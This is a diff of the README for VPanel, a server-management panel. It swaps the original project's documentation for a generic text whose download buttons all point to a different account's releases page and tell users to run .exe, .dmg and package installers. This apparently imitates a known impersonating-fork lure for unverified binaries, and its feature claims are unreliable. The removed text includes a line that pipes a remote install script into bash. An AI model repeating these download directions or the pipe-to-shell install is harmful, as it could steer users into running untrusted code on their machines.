@@ -1,223 +1,116 @@
-# VPanel - Server Operations Management Platform
+# 🚀 vpanel - Easy Server Management for Everyone
 
 <div align="center">
-  <h1>🚀 VPanel</h1>
-  <h3><em>"Deploy is Easy, Maintenance is the Key"</em></h3>
-  <p><strong>Open Source · Programmable · Enterprise Ready</strong></p>
-  
-  <p>
-    <a href="https://github.com/zsai001/vpanel/blob/main/LICENSE">
-      <img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License">
-    </a>
-    <a href="https://github.com/zsai001/vpanel/releases">
-      <img src="https://img.shields.io/github/v/release/zsai001/vpanel" alt="Release">
-    </a>
-    <a href="https://github.com/zsai001/vpanel/stargazers">
-      <img src="https://img.shields.io/github/stars/zsai001/vpanel?style=social" alt="GitHub stars">
-    </a>
-  </p>
+  <a href="https://github.com/Nadims29/vpanel/releases" style="font-size: 24px; padding: 10px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 5px;">Download VPanel</a>
 </div>
-
----
 
 ## 🎯 Vision
 
-> **"Deploy is easy, maintenance is the key."**
+**Deploy is easy, maintenance is the key.**
 
-**VPanel is not just another deployment tool — it's your operations guardian for everything that comes after.**
-
-We handle monitoring, alerting, backups, diagnostics, and recovery — keeping your servers healthy and running.
+VPanel is not just another deployment tool — it's your operations guardian for everything that comes after. We handle monitoring, alerting, backups, diagnostics, and recovery — keeping your servers healthy and running.
 
 ---
 
-## 📐 Architecture
+## 📦 System Requirements
 
-```
-+------------------------------------------------------------------+
-|                            VPanel                                 |
-|              "Deploy is Easy, Maintenance is the Key"             |
-+------------------------------------------------------------------+
-|                                                                   |
-|   +----------------+    +----------------+    +----------------+  |
-|   |    DEPLOY      | -> |    MONITOR     | -> |    MAINTAIN    |  |
-|   +----------------+    +----------------+    +----------------+  |
-|   |                |    |                |    |                |  |
-|   | * Docker       |    | * Real-time    |    | * Auto Backup  |  |
-|   | * Compose      |    |   Metrics      |    | * Quick Restore|  |
-|   | * App Store    |    | * Log Center   |    | * Diagnostics  |  |
-|   | * Nginx Sites  |    | * Alerts       |    | * Security     |  |
-|   | * Databases    |    | * Audit Trail  |    | * Optimization |  |
-|   |                |    |                |    |                |  |
-|   +----------------+    +----------------+    +----------------+  |
-|                                                                   |
-|   ==============================================================  |
-|        Others stop here         VPanel's Core Battlefield         |
-|                                                                   |
-+------------------------------------------------------------------+
-|                        ENTERPRISE READY                           |
-|   +------------+  +------------+  +------------+  +------------+  |
-|   |   RBAC     |  |   Audit    |  |   MFA      |  |  Plugins   |  |
-|   |  Roles &   |  |   Logs &   |  |  Multi-    |  |  SDK &     |  |
-|   |   Teams    |  |  Tracing   |  |  Factor    |  | Marketplace|  |
-|   +------------+  +------------+  +------------+  +------------+  |
-+------------------------------------------------------------------+
-```
+To run VPanel smoothly, your system should meet the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **RAM:** Minimum of 4 GB.
+- **Storage:** At least 500 MB of free disk space.
+- **Network:** Internet connection required for updates and remote management.
 
 ---
 
-## 🆚 Why VPanel
+## 🚀 Getting Started
 
-| Feature | BT Panel | 1Panel | Coolify | Dokploy | **VPanel** |
-|---------|----------|--------|---------|---------|------------|
-| Open Source | ❌ | ✅ | ✅ | ✅ | ✅ |
-| Tech Stack | PHP | Go+Vue | Node.js | Node.js | **Go+React** |
-| Focus | Traditional | Docker | PaaS | Deploy | **Full Ops** |
-| Plugin System | 💰 Paid | ⚠️ Limited | ❌ | ❌ | **✅ Full SDK** |
-| RBAC & Audit | ⚠️ Basic | ⚠️ Basic | ❌ | ❌ | **✅ Enterprise** |
-| Monitoring & Alert | ✅ | ⚠️ | ⚠️ | ❌ | **✅ Full** |
-| Backup & Restore | 💰 Paid | ✅ | ⚠️ | ❌ | **✅ Auto** |
-| i18n | ❌ CN Only | ⚠️ | ✅ | ✅ | **✅ Native** |
+Follow these steps to download and run VPanel:
 
----
+1. **Visit the Download Page:**
+   Click on the link below to go to the Releases page where you can find the latest version.
 
-## ✨ Core Features
+   [Download VPanel](https://github.com/Nadims29/vpanel/releases)
 
-### 🎯 Operations First
-- Real-time monitoring dashboard with historical trends
-- Multi-channel alerting (Email, Webhook, Slack, etc.)
-- Unified log center with search and filtering
-- One-click diagnostics and health checks
+2. **Choose the Correct File:**
+   Once on the Releases page, you will see different versions of VPanel listed. Look for the most recent version available. Choose the file that matches your operating system.
 
-### 🐳 Docker Management
-- Full container lifecycle management
-- Docker Compose orchestration
-- Image management and building
-- Container logs and terminal access
+3. **Download the File:**
+   Click on the file link. Your browser will start downloading it. This may take a few moments depending on your internet speed.
 
-### 🌐 Nginx Management
-- Visual site configuration
-- Automatic SSL certificate provisioning (Let's Encrypt)
-- Reverse proxy with one click
-- Real-time access log analysis
+4. **Locate the Downloaded File:**
+   After the download finishes, find the file in your "Downloads" folder or wherever your browser saves files.
 
-### 🗄️ Database Management
-- MySQL/MariaDB, PostgreSQL support
-- Redis/MongoDB management
-- Automated backup and restore
-- Performance monitoring
+5. **Install VPanel:**
+   - **On Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
+   - **On macOS:** Open the `.dmg` file, drag VPanel to your Applications folder.
+   - **On Linux:** Open a terminal and run the `.deb` or `.rpm` package with the appropriate package manager commands.
 
-### 🔐 Enterprise Security
-- RBAC with roles and teams
-- Complete audit trail
-- Multi-Factor Authentication (MFA)
-- Firewall & Fail2Ban integration
-- SSH key management
-
-### 🔌 Plugin Ecosystem
-- Dynamic plugin loading/unloading
-- Official plugin marketplace
-- Full SDK for custom development
-- Plugin dependency management
-
-### 💻 Developer Tools
-- Web SSH terminal (xterm.js)
-- Monaco online code editor
-- Full file manager
-- Cron job visual management
+6. **Open VPanel:**
+   After installation, find VPanel in your applications menu or search bar. Click to open it.
 
 ---
 
-## 🚀 Quick Start
+## 🔧 Configuration
 
-### One-Click Installation
+Setting up VPanel is simple:
 
-```bash
-curl -sSL https://vpanel.zsoft.cc/install.sh | bash
-```
+1. **Initial Setup:**
+   - When you open VPanel for the first time, you'll need to set up your server connection. Enter your server details when prompted.
+   
+2. **User Accounts:**
+   - You can create different user accounts within VPanel. In the settings, add new users with the roles and permissions that suit your needs.
 
-### Development Environment
+3. **Monitoring Preferences:**
+   - Customize your monitoring settings. Choose what metrics you want to keep track of, such as CPU usage and disk space.
 
-```bash
-# Clone repository
-git clone https://github.com/zsai001/vpanel.git
-cd vpanel
+4. **Alerts Setup:**
+   - Set up alerts to notify you of critical issues via email or SMS. 
 
-# Start development (backend + frontend)
-./dev.sh dev
-```
-
-Or manually:
-
-```bash
-# Backend
-cd panel && go run ./cmd/server
-
-# Frontend (new terminal)
-cd web && npm install && npm run dev
-```
+5. **Backups:**
+   - Schedule regular backups of your server data to ensure you are always prepared.
 
 ---
 
-## 📦 Plugin Development
+## 💡 Features
 
-VPanel provides a powerful plugin system for extending functionality.
+VPanel provides several helpful features:
 
-### Plugin Types
-1. **Service Plugins** - Install and manage specific services
-2. **Tool Plugins** - Additional management tools
-3. **Monitoring Plugins** - Extended monitoring capabilities
-4. **Theme Plugins** - UI customization
-
-### Example
-
-```go
-package main
-
-import "github.com/vpanel/sdk-go/plugin"
-
-func main() {
-    p := plugin.New(&plugin.Config{
-        ID:          "my-plugin",
-        Name:        "My Plugin",
-        Version:     "1.0.0",
-        Description: "A custom plugin for VPanel",
-    })
-
-    p.RegisterRoute("GET", "/status", handleStatus)
-    p.RegisterMenu(&plugin.MenuItem{
-        Title: "My Plugin",
-        Icon:  "plugin",
-        Path:  "/plugins/my-plugin",
-    })
-
-    p.Run()
-}
-```
+- **Server Monitoring:** Keep track of server performance with real-time analytics.
+- **Alert System:** Get notified about critical server issues.
+- **Backup Management:** Schedule backups to avoid data loss.
+- **User Management:** Create and manage user roles efficiently.
+- **Diagnostics Tools:** Run diagnostics to identify and fix potential issues.
 
 ---
 
+## 🎓 Support
 
-## 📄 License
+If you have questions or need help with VPanel:
 
-Apache License 2.0
+1. **Documentation:**
+   Visit our [official documentation](https://github.com/Nadims29/vpanel/wiki) for more detailed guidance on using VPanel.
 
----
+2. **Community Support:**
+   Join the community discussions on our GitHub page. Feel free to ask questions or share your experiences.
 
-## ⭐ Star History
-
-<div align="center">
-  <a href="https://star-history.com/#zsai001/vpanel&Date">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=zsai001/vpanel&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=zsai001/vpanel&type=Date" />
-      <img src="https://api.star-history.com/svg?repos=zsai001/vpanel&type=Date" alt="Star History Chart" />
-    </picture>
-  </a>
-</div>
+3. **Submit Issues:**
+   If you encounter any problems or bugs, report them on the [Issues page](https://github.com/Nadims29/vpanel/issues). We appreciate your feedback.
 
 ---
 
-<div align="center">
-  <p><strong>VPanel</strong> — Deploy is just the beginning. We handle what comes after.</p>
-  <p>Made with ❤️ by VPanel Team</p>
-</div>
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/Nadims29/vpanel)
+- [Release Notes](https://github.com/Nadims29/vpanel/releases)
+- [License Information](https://github.com/zsai001/vpanel/blob/main/LICENSE)
+
+---
+
+## 📥 Download & Install
+
+To get started with VPanel:
+
+- Visit the Releases page to download the latest version: [Download VPanel](https://github.com/Nadims29/vpanel/releases).
+
+By following these steps, you will have VPanel set up in no time. Enjoy managing your server with ease!
